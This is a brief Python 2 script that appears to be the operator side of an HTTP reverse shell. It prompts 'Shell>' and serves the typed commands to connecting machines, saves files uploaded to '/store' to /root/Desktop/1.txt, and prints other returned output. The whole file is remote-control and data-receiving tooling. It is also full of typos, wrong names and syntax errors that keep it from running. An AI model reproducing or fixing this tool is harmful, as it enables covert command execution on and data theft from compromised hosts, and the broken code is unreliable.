#!/usr/bin/python

import BaseHTTPServer
import os, cgi

hostName = '192.168.1.51'
portNumber = 80

class myhandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def do_GET(S):
		command = raw_input("Shell> ")
		s.send_response(200)
		s.semd_header("content-type", "text/html")
		s.end_headers()
		s.wfile.write(command)

	def do_POST(s):
		if s.path == '/store':
			try:
				ctype, pdict = cgi.parse_header(s,headers.getheader('content-type'))
				if  ctype == 'multipart/form-data' :
					fs = cgi.FieldSorage( fp = s.rfile,
						headers = s.headers,
						environ={ 'REQUEST_METHOD':'POST'}
						)
				else:
					print "[-] Unexpected POST request"

				fs_up = fs['file']


				with open('/root/Desktop/1.txt', 'wb') as o:
					o.write( fs_up.file.read() )
					s.send_response(200)
					s.end_headers()
			except Exeption as e:
				print end_headers
				return


		s.send_response(200)
		s,end_headers()
		length = int(s.headers['Content-length'])
		posVar = s.rfile.read(length )
		print posVar


if __name__ == '__main__':
	server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((hostName, portNumber), MyHandler)

	try:
		httpd.server_forever()
	except KeyboardInterrupt
	print '[!] Server is terminated'
	httpd.server_close()